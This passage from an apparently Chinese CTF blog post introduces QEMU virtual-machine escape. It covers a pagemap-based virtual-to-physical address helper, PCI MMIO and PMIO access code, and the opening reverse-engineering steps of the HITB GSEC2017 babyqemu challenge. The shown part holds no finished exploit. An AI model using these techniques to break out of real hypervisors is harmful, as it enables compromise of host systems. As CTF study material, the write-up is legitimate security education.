pagemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> offset = ((<span class="keyword">uintptr_t</span>)addr / PAGE_SIZE) * <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, offset, SEEK_SET) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (read(fd, &amp;data, <span class="number">8</span>) != <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;read&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(data &amp; (((<span class="keyword">uint64_t</span>)<span class="number">1</span> &lt;&lt; <span class="number">63</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;page&quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> pageframenum = data &amp; ((<span class="number">1ull</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">size_t</span> phyaddr = pageframenum * PAGE_SIZE + (<span class="keyword">uintptr_t</span>)addr % PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> phyaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *userbuf;</span><br><span class="line">    <span class="keyword">uint64_t</span> userbuf_pa;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open mmio&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap mmio&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem:\t%p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (userbuf == MAP_FAILED)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap userbuf&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(usebuf,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x1000</span>);</span><br><span class="line">    userbuf_pa = va2pa(userbuf);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;userbuf_va:\t%p\n&quot;</span>,userbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;userbuf_pa:\t%p\n&quot;</span>,(<span class="keyword">void</span> *)userbuf_pa);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PCI设备"><a href="#PCI设备" class="headerlink" title="PCI设备"></a>PCI设备</h2><p>符合 PCI 总线标准的设备就被称为 PCI 设备，PCI 总线架构中可以包含多个 PCI 设备。PCI 设备同时也分为主设备和目标设备两种，主设备是一次访问操作的发起者，而目标设备则是被访问者。</p><h3 id="mmio"><a href="#mmio" class="headerlink" title="mmio"></a>mmio</h3><p>而在设备中存在不同的地址映射模式。而mmio则是内存映射io，和内存共享一个地址空间。可以和像读写内存一样读写其内容。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/t01a97028b7de9d6955.png"                      alt="t01a97028b7de9d6955"                ></p><ul><li>  Bit 0：Region Type，总是为 0，用于区分此类型为 Memory</li><li>  Bits 2-1：Locatable，为 0 时表示采用 32 位地址，为 2 时表示采用 64 位地址，为 1 时表示区间大小小于 1MB</li><li>  Bit 3：Prefetchable，为 0 时表示关闭预取，为 1 时表示开启预取</li><li>  Bits 31-4：Base Address，以 16 字节对齐基址</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/mmio_mem.png"                      alt="mmio_mem"                ></p><p><strong>在用户态下访问mmio空间代码示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_mem @ %p\n&quot;</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    mmio_read(<span class="number">0x128</span>);</span><br><span class="line">    mmio_write(<span class="number">0x128</span>, <span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在内核态下访问mmio空间代码示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> addr=ioremap(ioaddr,iomemsize);</span><br><span class="line">readb(addr);</span><br><span class="line">readw(addr);</span><br><span class="line">readl(addr);</span><br><span class="line">readq(addr);<span class="comment">//qwords=8 btyes</span></span><br><span class="line"></span><br><span class="line">writeb(val,addr);</span><br><span class="line">writew(val,addr);</span><br><span class="line">writel(val,addr);</span><br><span class="line">writeq(val,addr);</span><br><span class="line">iounmap(addr);</span><br></pre></td></tr></table></figure><h3 id="pmio"><a href="#pmio" class="headerlink" title="pmio"></a>pmio</h3><p>端口映射io，内存和io设备有个字独立的地址空间，cpu需要通过专门的指令才能去访问。在intel的微处理器中使用的指令是IN和OUT。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/pmio.png"                      alt="pmio"                ></p><ul><li>  Bit 0：Region Type，总是为 1，用于区分此类型为 I/O</li><li>  Bit 1：Reserved</li><li>  Bits 31-2：Base Address，以 4 字节对齐基址</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/pmio_layout.png"                      alt="pmio_layout"                ></p><p><strong>访问pmio代码示例：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="keyword">uint32_t</span> pmio_base = <span class="number">0xc050</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outl(value,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">pmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">uint32_t</span>)inl(addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">        die(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        pmio_write(pmio_base+<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    pmio_write(pmio_base+<span class="number">4</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="lspci"><a href="#lspci" class="headerlink" title="lspci"></a>lspci</h3><p>pci外设地址，形如<code>0000:00:1f.1</code>。第一个部分16位表示域；第二个部分8位表示总线编号；第三个部分5位表示设备号；最后一个部分表示3位表示功能号。下面是lspci的输出，其中pci设备的地址，在最头部给出，由于pc设备总只有一个0号域，随意会省略域。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204154525744.png"                      alt="image-20230204154525744"                ></p><p>在<code>/sys/bus/pci/devices</code>可以找到每个总线设备相关的一写文件。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204155149832.png"                      alt="image-20230204155149832"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204155333889.png"                      alt="image-20230204155333889"                ></p><p>每个设备的目录下<code>resource0</code> 对应MMIO空间。<code>resource1</code> 对应PMIO空间。<br>resource文件里面会记录相关的数据，第一行就是mimo的信息，从左到右是：起始地址、结束地址、标识位。</p><h2 id="HITB-GSEC2017-babyqemu"><a href="#HITB-GSEC2017-babyqemu" class="headerlink" title="HITB GSEC2017 babyqemu"></a>HITB GSEC2017 babyqemu</h2><p><del>因为是第一次玩qemu逃逸，所以题目记录的比较详细，偏向新手向！</del></p><h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>首先注意的是加载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-kernel ./vmlinuz-4.8.0-52-generic \</span><br><span class="line">-append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span> \</span><br><span class="line">-enable-kvm \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M --nographic  -L ./dependency/usr/<span class="built_in">local</span>/share/qemu \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-device hitb,id=vda</span><br></pre></td></tr></table></figure><p>这里需要注意的是 -device 选项，可以看到这里的设备为 hitb 这个pci设备。</p><p>那么逆向的方法就是将qemu-system-x86_64拖入ida搜索hitb</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230204162747766.png"                      alt="image-20230204162747766"                ></p><p>首先则是先观察init函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ObjectClass_0 *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = object_class_dynamic_cast_assert(</span><br><span class="line">         a1,</span><br><span class="line">         (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_64A230.bulk_in_pending[<span class="number">2</span>].data[<span class="number">72</span>],</span><br><span class="line">         (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.msi_vectors,</span><br><span class="line">         <span class="number">469</span>,</span><br><span class="line">         <span class="string">&quot;hitb_class_init&quot;</span>);</span><br><span class="line">  BYTE4(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">16</span>;</span><br><span class="line">  HIWORD(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">255</span>;</span><br><span class="line">  v2[<span class="number">2</span>].type = (Type)pci_hitb_realize;</span><br><span class="line">  v2[<span class="number">2</span>].object_cast_cache[<span class="number">0</span>] = (<span class="keyword">const</span> <span class="keyword">char</span> *)pci_hitb_uninit;</span><br><span class="line">  LOWORD(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">4660</span>;</span><br><span class="line">  WORD1(v2[<span class="number">2</span>].object_cast_cache[<span class="number">3</span>]) = <span class="number">9011</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在init初始化函数，需要将设备类型定义为PCIDeviceClass结构体。PCIDeviceClass结构体在Local type中可以找到它的描述定义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  DeviceClass_0 parent_class;</span><br><span class="line">  <span class="keyword">void</span> (*realize)(PCIDevice_0 *, Error_0 **);    <span class="comment">//0xc0</span></span><br><span class="line">  <span class="keyword">int</span> (*init)(PCIDevice_0 *);</span><br><span class="line">  PCIUnregisterFunc *<span class="built_in">exit</span>;</span><br><span class="line">  PCIConfigReadFunc *config_read;</span><br><span class="line">  PCIConfigWriteFunc *config_write;</span><br><span class="line">  <span class="keyword">uint16_t</span> vendor_id;    <span class="comment">//0xe8</span></span><br><span class="line">  <span class="keyword">uint16_t</span> device_id;    <span class="comment">//0xea</span></span><br><span class="line">  <span class="keyword">uint8_t</span> revision;</span><br><span class="line">  <span class="keyword">uint16_t</span> class_id;</span><br><span class="line">  <span class="keyword">uint16_t</span> subsystem_vendor_id;</span><br><span class="line">  <span class="keyword">uint16_t</span> subsystem_id;</span><br><span class="line">  <span class="keyword">int</span> is_bridge;</span><br><span class="line">  <span class="keyword">int</span> is_express;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *romfile;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里手动添加一下结构体再修改init函数中的变量定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> PCIDeviceClass struc ; (<span class="keyword">sizeof</span>=<span class="number">0x108</span>, align=<span class="number">0x8</span>, copyof_1371)</span><br><span class="line"><span class="number">00000000</span> parent_class DeviceClass_0 ?</span><br><span class="line"><span class="number">000000</span>C0 realize dq ?                            ; offset</span><br><span class="line"><span class="number">000000</span>C8 init dq ?                               ; offset</span><br><span class="line"><span class="number">000000</span>D0 <span class="built_in">exit</span> dq ?                               ; offset</span><br><span class="line"><span class="number">000000</span>D8 config_read dq ?                        ; offset</span><br><span class="line"><span class="number">000000E0</span> config_write dq ?                       ; offset</span><br><span class="line"><span class="number">000000E8</span> vendor_id dw ?</span><br><span class="line"><span class="number">000000</span>EA device_id dw ?</span><br><span class="line"><span class="number">000000</span>EC revision db ?</span><br><span class="line"><span class="number">000000</span>ED db ? ; undefined</span><br><span class="line"><span class="number">000000</span>EE class_id dw ?</span><br><span class="line"><span class="number">000000F</span>0 subsystem_vendor_id dw ?</span><br><span class="line"><span class="number">000000F</span>2 subsystem_id dw ?</span><br><span class="line"><span class="number">000000F</span>4 is_bridge dd ?</span><br><span class="line"><span class="number">000000F</span>8 is_express dd ?</span><br><span class="line"><span class="number">000000F</span>C db ? ; undefined</span><br><span class="line"><span class="number">000000F</span>D db ? ; undefined</span><br><span class="line"><span class="number">000000F</span>E db ? ; undefined</span><br><span class="line"><span class="number">000000F</span>F db ? ; undefined</span><br><span class="line"><span class="number">00000100</span> romfile dq ?                            ; offset</span><br><span class="line"><span class="number">00000108</span> PCIDeviceClass ends</span><br><span class="line"><span class="number">00000108</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">hitb_class_init</span><span class="params">(ObjectClass_0 *a1, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           a1,</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_64A230.bulk_in_pending[<span class="number">2</span>].data[<span class="number">72</span>],</span><br><span class="line">                           (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;stru_5AB2C8.msi_vectors,</span><br><span class="line">                           <span class="number">469</span>,</span><br><span class="line">                           <span class="string">&quot;hitb_class_init&quot;</span>);</span><br><span class="line">  v2-&gt;revision = <span class="number">16</span>;</span><br><span class="line">  v2-&gt;class_id = <span class="number">255</span>;</span><br><span class="line">  v2-&gt;realize = pci_hitb_realize;</span><br><span class="line">  v2-&gt;<span class="built_in">exit</span> = pci_hitb_uninit;</span><br><span class="line">  v2-&gt;vendor_id = <span class="number">4660</span>;</span><br><span class="line">  v2-&gt;device_id = <span class="number">0x2333</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到设备号device_id=0x2333，功能号vendor_id=0x1234</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lspci -v</span></span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 00ff: 1234:2333</span><br><span class="line"></span><br><span class="line"><span class="comment"># ls /sys/bus/pci/devices/0000\:00\:04.0/</span></span><br><span class="line">broken_parity_status      firmware_node             rescan</span><br><span class="line">class                     irq                       resource</span><br><span class="line">config                    local_cpulist             resource0</span><br><span class="line">consistent_dma_mask_bits  local_cpus                subsystem</span><br><span class="line">d3cold_allowed            modalias                  subsystem_device</span><br><span class="line">device                    msi_bus                   subsystem_vendor</span><br><span class="line">dma_mask_bits             numa_node                 uevent</span><br><span class="line">driver_override           power                     vendor</span><br><span class="line"><span class="built_in">enable</span>                    remove</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat /sys/bus/pci/devices/0000\:00\:04.0/resource</span></span><br><span class="line">0x00000000fea00000 0x00000000feafffff 0x0000000000040200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>resource文件内容的格式为start end flag 。在resource0文件中，根据这里没有resource1文件或者根据flag最后一位为0可知存在一个MMIO的内存空间，地址为0xfea00000，大小为0x100000。</p><p>其次分析注册的函数，通过<code>pci_hitb_realize</code>函数查看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">pci_hitb_realize</span><span class="params">(HitbState *pdev, Error_0 **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pdev-&gt;pdev.config[<span class="number">61</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !msi_init(&amp;pdev-&gt;pdev, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">1</span>, <span class="number">0</span>, errp) )</span><br><span class="line">  &#123;</span><br><span class="line">    timer_init_tl(&amp;pdev-&gt;dma_timer, main_loop_tlg.tl[<span class="number">1</span>], <span class="number">1000000</span>, (QEMUTimerCB *)hitb_dma_timer, pdev);</span><br><span class="line">    qemu_mutex_init(&amp;pdev-&gt;thr_mutex);</span><br><span class="line">    qemu_cond_init(&amp;pdev-&gt;thr_cond);</span><br><span class="line">   